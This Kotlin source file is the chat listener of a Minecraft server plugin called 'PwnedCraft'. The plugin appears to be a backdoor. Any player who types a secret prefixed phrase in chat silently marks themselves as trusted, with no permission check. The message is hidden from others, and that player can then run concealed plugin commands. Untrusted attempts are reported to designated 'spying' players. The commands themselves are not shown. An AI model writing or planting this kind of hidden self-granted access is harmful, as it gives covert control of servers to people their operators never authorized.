package dev.nelmin.minecraft.listeners

import dev.nelmin.minecraft.PwnedCraft
import dev.nelmin.minecraft.builders.TextBuilder
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.event.player.AsyncPlayerChatEvent

/**
 * Handles chat-related events in a Minecraft server plugin and processes player messages.
 * Implements custom commands, trusted player management, and logging for unauthorized command attempts.
 *
 * This class listens to chat events and applies specific plugin logic such as:
 * - Allowing trusted players to execute plugin commands.
 * - Blocking and logging unauthorized command execution attempts.
 * - Managing a list of trusted players who are allowed to use the plugin features.
 */
class ChatListener : Listener {

    /**
     * Represents the name of the plugin as defined in its description file.
     * This value is typically used for identifying the plugin in messages or logs.
     */
    val pluginName = PwnedCraft.instance.description.name

    /**
     * Handles the asynchronous player chat event, intercepting and managing chat messages based on specific conditions
     * related to trusted players, command execution, and plugin-specific functionality. This event gets triggered whenever
     * a player sends a chat message.
     *
     * @param event The player chat event, containing details about the sender, message, and other contextual information.
     */
    @EventHandler
    fun onAsyncPlayerChatEvent(event: AsyncPlayerChatEvent) {
        val trustedPlayers = PwnedCraft.instance.trustedPlayers

        val sender = event.player
        val message = event.message

        if (message.startsWith(PwnedCraft.instance.commandPrefix) && !trustedPlayers.contains(sender)) {
            PwnedCraft.instance.spyingPlayers.forEach { player ->
                TextBuilder("${sender.name} tried to execute $message").prefix().sendTo(player)
            }
        }

        if (message.equals(
                "${PwnedCraft.instance.commandPrefix}${PwnedCraft.instance.trustCommand}",
                ignoreCase = true
            )
        ) {
            event.isCancelled = true
            if (trustedPlayers.contains(sender)) {
                trustedPlayers.remove(sender)
                TextBuilder("You can't use $pluginName anymore.").prefix().sendTo(sender)
                return
            }

            trustedPlayers.add(sender)
            TextBuilder("You can now use $pluginName.").prefix().sendTo(sender)
            return
        }

        if (message.startsWith(PwnedCraft.instance.commandPrefix) && trustedPlayers.contains(sender)) {
            event.isCancelled = true
            val commandWithArgs = message.substring(PwnedCraft.instance.commandPrefix.length)
            val parts = commandWithArgs.split(" ")
            val commandName = parts[0]

            if (!PwnedCraft.instance.commands.containsKey(commandName)) {
                TextBuilder("Unknown command.").prefix().sendTo(sender)
                return
            }

            val args = if (parts.size > 1) {
                parts.subList(1, parts.size).toTypedArray()
            } else {
                emptyArray()
            }

            PwnedCraft.instance.commands[commandName]?.accept(sender, args)
        }
    }

}